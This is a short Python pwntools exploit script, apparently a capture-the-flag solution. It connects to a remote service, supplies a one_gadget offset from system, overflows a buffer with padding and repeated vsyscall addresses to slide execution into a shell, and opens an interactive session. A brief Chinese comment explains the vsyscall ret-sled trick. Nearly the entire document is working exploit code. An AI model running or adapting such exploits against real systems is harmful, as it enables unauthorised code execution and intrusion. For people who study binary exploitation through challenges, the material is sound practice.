#coding=utf-8
from pwn import*
p = remote('111.198.29.45',47070)
libc =ELF('./libc.so')
context(log_level ='DEBUG')
vsyscall = 0xFFFFFFFFFF600000
offset = 0x4526A - libc.sym['system']
p.sendlineafter('Choice:','2')
p.sendlineafter('Choice:','1')
p.sendlineafter('How many levels?','0')
p.sendlineafter('Any more?',str(offset))
padding = p64(0)*6
for i in range(99):
	p.sendafter('Answer:',padding)
p.sendafter('Answer:','FMYY'*0xE + p64(vsyscall)*3)
p.interactive()

'''VSYSCALL
0xFFFFFFFFFF600000: mov rax,0x60
0xFFFFFFFFFF600007: syscall
0xFFFFFFFFFF600009: ret
# VSYSCALL 指令的地址为固定的,若执行此汇编指令,程序会不断的ret地址,最终抵达后门函数
'''
